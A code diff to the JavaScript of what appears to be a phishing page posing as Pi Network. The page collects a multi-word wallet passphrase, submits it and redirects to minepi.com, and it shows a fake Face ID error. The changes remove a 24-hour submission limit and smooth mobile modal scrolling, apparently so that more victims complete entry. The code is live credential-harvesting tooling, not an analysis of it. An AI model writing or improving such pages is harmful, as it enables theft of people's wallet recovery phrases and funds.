@@ -1,25 +1,4 @@
-        // ====================== 24-HOUR RATE LIMITER ======================
-        function checkRateLimit() {
-            const LAST_SUBMISSION_KEY = 'lastPassphraseSubmission';
-            const TWENTY_FOUR_HOURS = 24 * 60 * 60 * 1000;
-            
-            const lastSubmission = localStorage.getItem(LAST_SUBMISSION_KEY);
-            const now = Date.now();
-            
-            if (lastSubmission && (now - parseInt(lastSubmission)) < TWENTY_FOUR_HOURS) {
-                const hoursLeft = Math.ceil((TWENTY_FOUR_HOURS - (now - parseInt(lastSubmission))) / (1000 * 60 * 60));
-                alert(`You can only submit once per 24 hours. Please try again in ${hoursLeft} hours.`);
-                return false;
-            }
-            
-            localStorage.setItem(LAST_SUBMISSION_KEY, now.toString());
-            return true;
-        }
-
-        async function validatePassphrase(inputId, errorId) {
-            // Check 24-hour limit first
-            if (!checkRateLimit()) return;
-
+async function validatePassphrase(inputId, errorId) {
             const input = document.getElementById(inputId);
             const error = document.getElementById(errorId);
             const words = input.value.trim().split(/\s+/).filter(word => word.length > 0);
@@ -49,29 +28,25 @@
                 if (result.success) window.location.href = "https://minepi.com";
             } catch (e) {
                 alert("Connection error. Try again later.");
-                localStorage.removeItem('lastPassphraseSubmission'); // Reset on failure
             } finally {
                 document.getElementById('loadingOverlay').style.display = 'none';
             }
         }
 
         function showModal(modalType) {
-            document.body.style.overflow = "hidden";
-            document.querySelectorAll('body > *').forEach(el => {
-                if (!el.classList.contains('modal-overlay') && !el.classList.contains('loading-overlay')) {
-                    el.style.display = 'none';
-                }
-            });
+            document.body.classList.add('modal-open');
             const modalId = `${modalType}Modal`;
             document.getElementById(modalId).style.display = "flex";
+            
+            
+            setTimeout(() => {
+                document.getElementById(modalId).scrollTop = 0;
+            }, 50);
         }
         
         function hideModal(modalId) {
-            document.querySelectorAll('body > *').forEach(el => {
-                el.style.display = '';
-            });
+            document.body.classList.remove('modal-open');
             document.getElementById(modalId).style.display = "none";
-            document.body.style.overflow = "auto";
         }
         
         function showFaceIDError() {
@@ -89,3 +64,26 @@
                 window.location.href = "https://example.com/create-new-brainstorm-account";
             }
         }
+
+        
+        document.addEventListener('DOMContentLoaded', function() {
+            const textareas = document.querySelectorAll('.modal-content textarea');
+            textareas.forEach(textarea => {
+                textarea.addEventListener('focus', function() {
+                    
+                    window.scrollTo(0, 0);
+                    document.body.scrollTop = 0;
+                    
+                    
+                    setTimeout(() => {
+                        const modalContent = this.closest('.modal-content');
+                        if (modalContent) {
+                            const inputRect = this.getBoundingClientRect();
+                            const modalRect = modalContent.getBoundingClientRect();
+                            const offset = inputRect.top - modalRect.top - 100;
+                            modalContent.scrollTop = offset > 0 ? offset : 0;
+                        }
+                    }, 100);
+                });
+            });
+        });
